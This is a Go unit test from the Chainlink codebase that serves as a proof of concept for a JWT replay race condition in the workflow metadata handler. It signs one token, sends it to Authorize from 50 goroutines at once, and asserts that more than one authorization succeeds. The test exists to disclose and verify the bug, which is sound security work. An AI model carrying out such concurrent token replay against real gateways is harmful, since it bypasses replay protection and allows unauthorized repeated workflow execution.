package v2

import (
	"encoding/json"
	"strings"
	"sync"
	"testing"

	"github.com/ethereum/go-ethereum/crypto"
	"github.com/stretchr/testify/require"

	jsonrpc "github.com/smartcontractkit/chainlink-common/pkg/jsonrpc2"
	gateway_common "github.com/smartcontractkit/chainlink-common/pkg/types/gateway"
	"github.com/smartcontractkit/chainlink/v2/core/utils"
)

func TestWorkflowMetadataHandler_Authorize_Race_PoC(t *testing.T) {
	handler, _, _ := createTestWorkflowMetadataHandler(t)
	privateKey, err := crypto.GenerateKey()
	require.NoError(t, err)
	signerAddr := crypto.PubkeyToAddress(privateKey.PublicKey)

	workflowID := testWorkflowID1
	authorizedKey := gateway_common.AuthorizedKey{
		KeyType:   gateway_common.KeyTypeECDSAEVM,
		PublicKey: strings.ToLower(signerAddr.Hex()),
	}
	handler.authorizedKeys = map[string]map[gateway_common.AuthorizedKey]struct{}{
		workflowID: {authorizedKey: {}},
	}

	params := json.RawMessage(`{"test": "data"}`)
	req := &jsonrpc.Request[json.RawMessage]{
		Version: "2.0",
		ID:      "test-request-id",
		Method:  gateway_common.MethodWorkflowExecute,
		Params:  &params,
	}

	token, err := utils.CreateRequestJWT(*req)
	require.NoError(t, err)
	tokenString, err := token.SignedString(privateKey)
	require.NoError(t, err)

	// We want to call Authorize multiple times concurrently with the same token
	var wg sync.WaitGroup
	numConcurrent := 50 // Increase chances of hitting the race
	results := make(chan error, numConcurrent)
	for i := 0; i < numConcurrent; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, err := handler.Authorize(workflowID, tokenString, req)
			results <- err
		}()
	}
	wg.Wait()
	close(results)

	successCount := 0
	for err := range results {
		if err == nil {
			successCount++
		}
	}

	t.Logf("Successful authorizations: %d out of %d", successCount, numConcurrent)

	// If it's more than 1, the race condition is proven!
	require.Greater(t, successCount, 1, "VULNERABILITY: JWT Replay Race condition proven! Multiple successful authorizations for the same token.")
}
